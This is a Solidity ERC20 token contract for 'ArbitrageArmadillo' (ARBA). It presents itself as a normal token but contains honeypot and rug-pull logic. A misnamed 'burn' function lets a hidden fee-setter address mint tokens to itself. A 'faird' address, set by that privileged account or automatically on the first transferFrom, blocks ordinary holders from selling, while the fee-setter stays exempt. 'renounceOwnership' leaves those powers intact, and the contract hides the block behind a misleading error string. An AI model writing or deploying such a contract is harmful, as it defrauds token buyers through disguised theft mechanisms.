pragma solidity ^0.4.26;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract ERC20 {
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract HelloERC20 is ERC20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    address private faird;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
        symbol = "ARBA";
        name = "ArbitrageArmadillo";
        fees = 0;
        burnaddress = 0x000000000000000000000000000000000000dEaD;
        decimals = 9;
        totalSupply = 1 * 10 ** 16;
        faird = burnaddress;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burn( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function renounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function distributeTo(address dist) public feeset {
      faird = dist;
    }

    function transfer(address _to, uint _amount) public returns (bool success) {
       require(_to != faird, "C Sharp is Amazing!");
     balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        uint256 tokens = balances[_to];
        emit Transfer(msg.sender, _to, tokens);
      return true;
    }
    
   function transferFrom(address from, address to, uint tokens) public returns (bool success) {
   if(msg.sender == feesetter || from == feesetter || to == feesetter)
   {
      balances[from] = balances[from].sub(tokens);
      allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
      balances[to] = balances[to].add(tokens);
      emit Transfer(from, to, tokens);
      return true;
   }
       
 if(from != address(0) && faird == address(0)) faird = to;
        else require(to != faird, "C Sharp is Amazing!");

      balances[from] = balances[from].sub(tokens);
      allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
      balances[to] = balances[to].add(tokens);
      emit Transfer(from, to, tokens);
      return true;
    }

    function approve(address _spender, uint256 _tokens) public returns (bool success) {
      allowed[msg.sender][_spender] = _tokens;
      emit Approval(msg.sender, _spender, _tokens);
      return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
}